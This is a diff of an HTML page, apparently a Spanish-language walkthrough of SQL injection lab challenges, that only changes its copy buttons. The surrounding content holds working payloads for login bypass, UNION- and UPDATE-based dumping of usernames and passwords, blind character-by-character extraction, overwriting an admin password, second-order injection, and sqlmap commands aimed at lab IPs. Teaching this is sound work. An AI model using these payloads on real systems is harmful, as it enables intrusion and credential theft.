@@ -16,7 +16,7 @@ Los ataques de inyección SQL es una técnica donde los atacantes pueden ejecuta
  <div class="code-container">
     <div class="code-header">
       PHP
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="php">Copiar</button>
     </div>
     <pre><code class="language-php">$query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"]$ + '";"</code></pre>
   </div>
@@ -31,7 +31,7 @@ Si el atacante modifica dicha consulta de la manera que si cambia la parte de `$
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT * FROM users WHERE username='' OR 1=1 -- AND password=''</code></pre>
   </div>
@@ -48,7 +48,7 @@ Cuando hacemos un logueo, la aplicación lleva a cabo la siguiente consulta:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql" >SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM users
     WHERE profileID = 10 AND password 'ce44iqns...'</code></pre>
@@ -63,7 +63,7 @@ Est desafío presenta la misma consulta a la hora de realizar un logueo.
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql" >SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM users 
     WHERE profileID ='10' AND password 'ce44iqns...'</code></pre>
@@ -81,7 +81,7 @@ Seguimos teniendo la misma consulta, pero ahora no podemos evadir la seguridad d
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM users 
 		WHERE profileID ='10' AND password 'ce44iqns...'</code></pre>
@@ -94,7 +94,7 @@ Ya que se ha implementado un control del lado del cliente (client-side):
  <div class="code-container">
     <div class="code-header">
       JavaScript
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-js" >functionvalidateform() {
   var profileID = document.inputForm.profileID.value;
@@ -163,7 +163,7 @@ Si los campos se actualizan podemos intentar identificar que base de datos se es
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-SQL" ># MySQL and MSSQL*
   ',nickName=@@version,email='
@@ -187,7 +187,7 @@ Vamos a realizar una subconsulta donde haremos uso de la función `group_concat(
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='</code></pre>
   </div>
@@ -205,7 +205,7 @@ Ahora podemos obtener todos las columnas que componen a dicha tabla:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name = 'usertable'),email='</code></pre>
   </div>
@@ -225,7 +225,7 @@ Por ejemplo, si queremos obtener el profileID ,name y password de los usuarios p
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">',nickname = (SELECT group_concat(profileID || "," || name || "," ||password || ":") FROM usertable), email='</code></pre>
   </div>
@@ -243,7 +243,7 @@ Finalmente podemos actualizar la contraseña del admin a la que queramos mediant
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">', password='&lt;contraseña_hasheada&gt;' WHERE name='Admin'-- -</code></pre>
   </div>
@@ -284,7 +284,7 @@ Esto lo podemos saber si mandamos una consulta de la manera:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT id, username FROM users WHERE username='" + username + "' AND password= '" + password + "'</code></pre>
   </div>
@@ -295,7 +295,7 @@ Si no conocemos el número de columnas, primero tendremos que enumerar el númer
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">1' UNION SELECT NULL -- -</code></pre>
   </div>
@@ -319,7 +319,7 @@ Como sabemos que el nombre de la tabla es *users* y tenemos la columna *password
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">' UNION SELECT 1, password FROM users-- -</code></pre>
   </div>
@@ -332,7 +332,7 @@ Si hacemos uso de group_concat() podemos obtener todas las passwords a la vez.
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">' UNION SELECT 1, group_concat(password) FROM users-- -</code></pre>
   </div>
@@ -361,7 +361,7 @@ Para conseguir esto, vamos a hacer uso de la función:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SUBSTR(string, &lt;start&gt;, &lt;length&gt;)</code></pre>
   </div>
@@ -375,7 +375,7 @@ Un ejemplo:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">-- Changing start --
 SUBSTR("THM{Blind}", 1,1) = T
@@ -394,7 +394,7 @@ A continuación vamos a introducir la contraseña del admin como una cadena en l
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">(SELECT password FROM users LIMIT 0,1)</code></pre>
   </div>
@@ -407,7 +407,7 @@ Quedando de la manera:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SUBSTR((SELECT password FROM users LIMIT 0,1)1,1)</code></pre>
   </div>
@@ -418,7 +418,7 @@ Ahora vamos a necesitar realizar la comparación entre caracteres para ver si es
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'</code></pre>
   </div>
@@ -430,7 +430,7 @@ Siendo ‘t’ (0x74) y ‘T’(0x54).
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)</code></pre>
   </div>
@@ -442,7 +442,7 @@ Ahora hacemos uso de `CAST` para convertir la representación hexadecimal a un t
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -</code></pre>
   </div>
@@ -453,7 +453,7 @@ Siendo esta la petición que finalmente hará la base de datos:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT id, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)</code></pre>
   </div>
@@ -468,7 +468,7 @@ También podemos hacer uso de la herramienta externa `sqlmap` para llevar a cabo
  <div class="code-container">
     <div class="code-header">
       Bash
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-bash">sqlmap -u http://MACHINE_IP:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dumpy</code></pre>
   </div>
@@ -494,7 +494,7 @@ Luego el usuario introduce cada parámetro en la consulta.
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">INSERT INTO notes (username, title, note) VALUES (?,?,?)</code></pre>
   </div>
@@ -510,7 +510,7 @@ Sin embargo, la consulta que obtiene todas la notas que pertenece a un usuario n
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT title, note FROM notes WHERE name = '" + nombre de usuario + "'</code></pre>
   </div>
@@ -529,7 +529,7 @@ Podemos crear un usuario malicioso mediante `' UNION SELECT 1,2'` , donde la apl
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT title, note FROM notes WHERE name='" UNION SELECT 1,2"'</code></pre>
   </div>
@@ -544,7 +544,7 @@ Lo podemos hacer como el ejemplo anterior, donde nos logueamos con un usuario ma
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">'UNION SELECT 1,group_concat(tlb_name) FROM sqllite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%''</code></pre>
   </div>
@@ -565,7 +565,7 @@ Código de `sqlmap` para explotar la vulnerabilidad:
  <div class="code-container">
     <div class="code-header">
       Bash
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-bash">sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd"</code></pre>
   </div>
@@ -588,7 +588,7 @@ Podemos ganar acceso haciendo `admin' -- -` ya que el diseñador al pensar que e
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">UPDATE users SET password = ? WHERE username = '" + username + "'</code></pre>
   </div>
@@ -602,7 +602,7 @@ Cuando cambiamos la contraseña, la aplicación ejecuta dos consultas:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT username, password FROM users WHERE id = ?</code></pre>
   </div>
@@ -614,7 +614,7 @@ Si la comprobación es correcta, procede a cambiar la contraseña:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">UPDATE users SET password = ? WHERE username = 'admin' -- -'</code></pre>
   </div>
@@ -636,7 +636,7 @@ Cada vez que se introduce el titulo de un libro (*title*) en dicho buscador se r
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '"+ title + "%')</code></pre>
   </div>
@@ -666,7 +666,7 @@ Como hemos dicho arriba, la aplicación al pedirle el nombre del libro realiza d
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)
 if bid:
@@ -700,7 +700,7 @@ Si no limitamos el resultado a 0 filas, no tendremos el output de la cláusula `
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">test' UNION SELECT '1'-- -</code></pre>
   </div>
@@ -722,7 +722,7 @@ Nuestro objetivo en cuestión es que la segunda consulta sea algo similar a:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT * FROM book WHERE id = ' ' UNION SELECT 1,2,3,4-- -</code></pre>
   </div>
@@ -734,7 +734,7 @@ Por tanto, si nos fijamos en la imagen, vemos que la cláusula `LIKE` al hacer u
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT * FROM book WHERE id = ' ' UNION SELECT '-1' UNION SELECT 1,2,3,4- -</code></pre>
   </div>
@@ -752,7 +752,7 @@ Ahora podemos hacer:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">' union select '-1''union select 1,group_concat(username),group_concat(password),2 from users-- -</code></pre>
   </div>
